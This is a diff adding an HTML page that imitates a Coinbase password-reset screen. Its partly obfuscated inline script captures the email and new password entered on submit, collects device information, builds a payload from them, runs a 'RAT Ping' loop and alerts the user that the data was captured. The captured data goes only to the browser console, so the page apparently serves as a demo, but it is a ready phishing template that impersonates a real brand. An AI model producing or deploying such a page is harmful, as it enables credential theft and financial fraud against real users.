@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reset Your Coinbase Password</title>
+</head>
+<body style="font-family: Arial, sans-serif; background: #ffffff; margin: 0; padding: 20px;">
+    <div style="max-width: 400px; margin: 0 auto; background: #fff; padding: 30px; border: 1px solid #e0e0e0; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+        <h2 style="font-size: 24px; color: #1a1a1a; text-align: center; margin-bottom: 20px;">Reset Your Password</h2>
+        <p style="font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; line-height: 1.5;">Enter your email and new password to reset your Coinbase account.</p>
+        <form id="ratForm" method="POST" style="margin: 0;">
+            <input type="email" name="email" placeholder="Email" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 4px; box-sizing: border-box; font-size: 14px;">
+            <input type="password" name="password" placeholder="New Password" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 4px; box-sizing: border-box; font-size: 14px;">
+            <button type="submit" style="width: 100%; padding: 12px; background: #0052ff; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Reset Password</button>
+        </form>
+        <div style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;">
+            <p>Need help? <a href="https://support.coinbase.com" style="color: #0052ff; text-decoration: none;">Contact Support</a></p>
+            <p>Coinbase, Inc. | San Francisco, CA</p>
+        </div>
+    </div>
+    <script>
+        (function() {
+            var _0x = ["email", "password", "querySelector", "value", "POST"];
+            var info = navigator.userAgent + " | " + screen.width + "x" + screen.height + " | " + new Date().toISOString();
+            console.log("Device Info: " + info);
+            document.getElementById("ratForm").addEventListener("submit", function(e) {
+                e.preventDefault();
+                var em = this[_0x[2]]('input[name="' + _0x[0] + '"]')[_0x[3]];
+                var pw = this[_0x[2]]('input[name="' + _0x[1] + '"]')[_0x[3]];
+                var payload = _0x[0] + "=" + encodeURIComponent(em) + "&" + _0x[1] + "=" + encodeURIComponent(pw);
+                console.log("Captured Payload: " + payload);
+                setInterval(function() {
+                    console.log("RAT Ping: Status Active");
+                }, 5000);
+                alert("Password reset successful! (Check console for captured data)");
+            });
+        })();
+    </script>
+</body>
+</html>
